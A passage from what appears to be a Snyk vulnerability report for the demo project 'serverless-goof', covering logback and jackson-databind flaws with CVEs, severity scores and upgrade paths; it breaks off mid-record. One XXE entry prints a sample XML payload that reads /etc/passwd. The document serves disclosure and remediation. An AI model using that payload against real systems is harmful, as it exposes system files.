{
  "vulnerabilities": [
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N",
      "alternativeIds": [],
      "creationTime": "2021-09-29T13:37:34.088850Z",
      "credit": [
        "Andrei Komarov"
      ],
      "cvssScore": 4.8,
      "description": "## Overview\n[ch.qos.logback:logback-core](https://mvnrepository.com/artifact/ch.qos.logback/logback-core) is a logback-core module.\n\nAffected versions of this package are vulnerable to Insufficient Hostname Verification. `X.509` are not properly validated. By spoofing the TLS/SSL server via a certificate that appears valid, an attacker with the ability to intercept network traffic (e.g. MitM, DNS cache poisoning) can disclose and optionally manipulate transmitted data.\n## Remediation\nUpgrade `ch.qos.logback:logback-core` to version 1.2.7 or higher.\n## References\n- [GitHub Commit](https://github.com/qos-ch/logback/commit/626c7733c188f2ad60c1348a493761f60e2d7958)\n- [GitHub PR](https://github.com/qos-ch/logback/pull/305)\n- [Jira Issue](https://jira.qos.ch/browse/LOGBACK-1574)\n",
      "disclosureTime": "2021-09-29T13:37:31Z",
      "exploit": "Not Defined",
      "functions": [],
      "fixedIn": [
        "1.2.7"
      ],
      "id": "SNYK-JAVA-CHQOSLOGBACK-1726923",
      "identifiers": {
        "CWE": [
          "CWE-20"
        ],
        "CVE": []
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-11-19T16:36:31.923913Z",
      "moduleName": "ch.qos.logback:logback-core",
      "packageManager": "maven",
      "packageName": "ch.qos.logback:logback-core",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-10-01T14:33:15Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/qos-ch/logback/commit/626c7733c188f2ad60c1348a493761f60e2d7958"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/qos-ch/logback/pull/305"
        },
        {
          "title": "Jira Issue",
          "url": "https://jira.qos.ch/browse/LOGBACK-1574"
        }
      ],
      "severity": "medium",
      "socialTrendAlert": false,
      "title": "Insufficient Hostname Verification",
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.2.7)"
        ]
      },
      "mavenModuleName": {
        "groupId": "ch.qos.logback",
        "artifactId": "logback-core"
      },
      "severityWithCritical": "medium",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "org.springframework.cloud:spring-cloud-function-adapter-aws@1.0.0.RC2",
        "org.springframework.boot:spring-boot-starter@2.0.2.RELEASE",
        "org.springframework.boot:spring-boot-starter-logging@2.0.2.RELEASE",
        "ch.qos.logback:logback-classic@1.2.3",
        "ch.qos.logback:logback-core@1.2.3"
      ],
      "upgradePath": [
        false,
        "org.springframework.cloud:spring-cloud-function-adapter-aws@3.1.6",
        "org.springframework.boot:spring-boot-starter@2.4.13",
        "org.springframework.boot:spring-boot-starter-logging@2.4.13",
        "ch.qos.logback:logback-classic@1.2.7",
        "ch.qos.logback:logback-core@1.2.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "ch.qos.logback:logback-core",
      "version": "1.2.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-09-18T13:46:28.613692Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `com.pastdev.httpcomponents.configuration.JndiConfiguration`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.6 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2798)\n",
      "disclosureTime": "2020-09-18T13:44:12Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.6)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.6"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1009829",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-24750"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-11-15T15:50:13.158209Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-09-18T16:19:32Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2798"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.6)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.6)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.6"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2020-11-29T12:43:11.601162Z",
      "credit": [
        "Srikanth Ramu",
        "threedr3am'follower"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to the class `ignite-jta`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.4 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2658)\n- [GitHub PR](https://github.com/FasterXML/jackson-databind/pull/2864#issuecomment-701026600)\n",
      "disclosureTime": "2020-09-29T22:30:33Z",
      "exploit": "Unproven",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.4)",
            "[2.7.0,2.9.10.4)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.4"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1047324",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-10650"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2020-11-30T11:05:04.047999Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-11-29T15:58:07.317638Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2658"
        },
        {
          "title": "GitHub PR",
          "url": "https://github.com/FasterXML/jackson-databind/pull/2864%23issuecomment-701026600"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.6.7.4)",
            "[2.7.0,2.9.10.4)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.6.7.4)",
          "[2.7.0,2.9.10.4)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.4"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:L",
      "alternativeIds": [],
      "creationTime": "2020-12-04T11:58:40.054903Z",
      "credit": [
        "Bartosz Baranowski"
      ],
      "cvssScore": 8.2,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to XML External Entity (XXE) Injection. A flaw was found in FasterXML Jackson Databind, where it does not have entity expansion secured properly in the `DOMDeserializer` class. The highest threat from this vulnerability is data integrity.\n\n## Details\nXXE Injection is a type of attack against an application that parses XML input.\nXML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.\n\nAttacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.\n\nFor example, below is a sample XML document, containing an XML element- username.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n   <username>John</username>\n</xml>\n```\n\nAn external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.\n\n```\n<xml>\n<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n<!DOCTYPE foo [\n   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>\n   <username>&xxe;</username>\n</xml>\n```\n\nOther XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.\n\n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.6.7.4, 2.9.10.7, 2.10.5.1 or higher.\n## References\n- [GitHub Commit](https://github.com/FasterXML/jackson-databind/commit/612f971b78c60202e9cd75a299050c8f2d724a59)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2589)\n- [RedHat Bugzilla Bug](https://bugzilla.redhat.com/show_bug.cgi?id=1887664)\n",
      "disclosureTime": "2020-12-04T11:54:03Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ext/DOMSerializer.java",
            "className": "DOMSerializer",
            "functionName": "<init>"
          },
          "version": [
            "[2.6.0,2.6.7.4)",
            "[2.9.0,2.9.10.7)",
            "[2.10.0, 2.10.5.1)"
          ]
        }
      ],
      "fixedIn": [
        "2.6.7.4",
        "2.9.10.7",
        "2.10.5.1"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1048302",
      "identifiers": {
        "CWE": [
          "CWE-611"
        ],
        "GHSA": [
          "GHSA-288c-cq4h-88gq"
        ],
        "CVE": [
          "CVE-2020-25649"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-02-19T10:26:08.917970Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-12-04T15:22:52Z",
      "references": [
        {
          "title": "GitHub Commit",
          "url": "https://github.com/FasterXML/jackson-databind/commit/612f971b78c60202e9cd75a299050c8f2d724a59"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2589"
        },
        {
          "title": "RedHat Bugzilla Bug",
          "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1887664"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "XML External Entity (XXE) Injection",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ext.DOMSerializer",
            "functionName": "<init>"
          },
          "version": [
            "[2.6.0,2.6.7.4)",
            "[2.9.0,2.9.10.7)",
            "[2.10.0, 2.10.5.1)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[2.6.0,2.6.7.4)",
          "[2.9.0,2.9.10.7)",
          "[2.10.0, 2.10.5.1)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.7"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2020-12-18T11:37:26.422837Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `org.apache.commons.dbcp2.datasources.PerUserPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2986)\n",
      "disclosureTime": "2020-12-18T11:32:48Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr1)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1052449",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-35490"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:56:23.781786Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-12-18T16:33:11Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2986"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr1)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
      "alternativeIds": [],
      "creationTime": "2020-12-18T11:40:53.658144Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `org.apache.commons.dbcp2.datasources.SharedPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating object from sequence of bytes is called deserialization. Serialization is commonly used for communication (sharing objects between multiple hosts) and persistence (store the object state in a file or a database). It is an integral part of popular protocols like _Remote Method Invocation (RMI)_, _Java Management Extension (JMX)_, _Java Messaging System (JMS)_, _Action Message Format (AMF)_, _Java Server Faces (JSF) ViewState_, etc.\n\n_Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)), is when the application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, letting the attacker to control the state or the flow of the execution.\n\nJava deserialization issues have been known for years. However, interest in the issue intensified greatly in 2015, when classes that could be abused to achieve remote code execution were found in a [popular library (Apache Commons Collection)](https://snyk.io/vuln/SNYK-JAVA-COMMONSCOLLECTIONS-30078). These classes were used in zero-days affecting IBM WebSphere, Oracle WebLogic and many other products.\n\n  \nAn attacker just needs to identify a piece of software that has both a vulnerable class on its path, and performs deserialization on untrusted data. Then all they need to do is send the payload into the deserializer, getting the command executed.\n  \n\n> Developers put too much trust in Java Object Serialization. Some even de-serialize objects pre-authentication. When deserializing an Object in Java you typically cast it to an expected type, and therefore Java's strict type system will ensure you only get valid object trees. Unfortunately, by the time the type checking happens, platform code has already created and executed significant logic. So, before the final type is checked a lot of code is executed from the readObject() methods of various objects, all of which is out of the developer's control. By combining the readObject() methods of various classes which are available on the classpath of the vulnerable application an attacker can execute functions (including calling Runtime.exec() to execute local OS commands).\n\n- Apache Blog\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2986)\n",
      "disclosureTime": "2020-12-18T11:40:13Z",
      "exploit": "Not Defined",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr1)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1052450",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-35491"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:57:34.286750Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-12-18T16:33:11Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2986"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.10.0.pr1)"
          ]
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.fasterxml.jackson.core",
        "artifactId": "jackson-databind"
      },
      "severityWithCritical": "high",
      "from": [
        "serverless-goof:todo@1.0-SNAPSHOT",
        "com.fasterxml.jackson.core:jackson-databind@2.9.3"
      ],
      "upgradePath": [
        false,
        "com.fasterxml.jackson.core:jackson-databind@2.9.10.8"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.9.3"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2020-12-27T14:34:18.527699Z",
      "credit": [
        "bu5yer"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. It mishandles the interaction between serialization gadgets and typing, related to `com.oracle.wls.shaded.org.apache.xalan.lib.sql.JNDIConnectionPool` (aka embedded Xalan in `org.glassfish.web/javax.servlet.jsp.jstl`).\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Donâ€™t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2999)\n- [Medium Post](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Al1ex/CVE-2020-35728)\n",
      "disclosureTime": "2020-12-27T14:05:38Z",
      "exploit": "Proof of Concept",
      "functions": [
        {
          "functionId": {
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "className": "ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[2.0.0, 2.9.10.8)"
          ]
        }
      ],
      "fixedIn": [
        "2.9.10.8"
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1054588",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "CVE": [
          "CVE-2020-35728"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-25T15:59:33.790019Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2020-12-27T17:34:55Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2999"
        },
        {
          "title": "Medium Post",
          "url": "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-35728"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
